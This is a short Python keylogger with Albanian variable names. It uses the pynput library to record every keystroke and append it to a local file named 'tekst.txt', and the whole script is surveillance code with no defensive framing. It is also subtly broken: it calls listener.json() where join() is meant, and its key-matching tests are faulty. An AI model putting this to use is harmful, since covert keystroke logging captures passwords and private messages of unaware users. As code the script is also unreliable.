import os
from pynput.keyboard import Listener


qelesat = []
numerimi = 0

path = 'tekst.txt'


def on_press(qeles) :
	global qelesat, numerimi


	qelesat.append(qeles)
	numerimi +=1

	if numerimi >= 1:
		numerimi = 0
		write_file(qelesat)
		qelesat = []

def write_file(qelesat):
	with open(path,"a") as file:
		for qeles in qelesat:
			k = str(qeles).replace("'","")
			
			if k.find('backspace') > 0:
				file.write(' Backspace ')
				
			elif k.find('space') > 0:
				file.write(' Space ')
				
			elif k.find('shift') > 0:
				file.write(' Shift ')
				
			elif k.find('enter') > 0:
				file.write('\n')
				
			elif k.find('caps_lock') > 0:
				file.write(' Caps_lock ')
				
			elif k.find('esc') > 0:
				return False
			
			elif k.find('qeles'):
				file.write(k)
				
with Listener(on_press=on_press) as listener:
	listener.json()
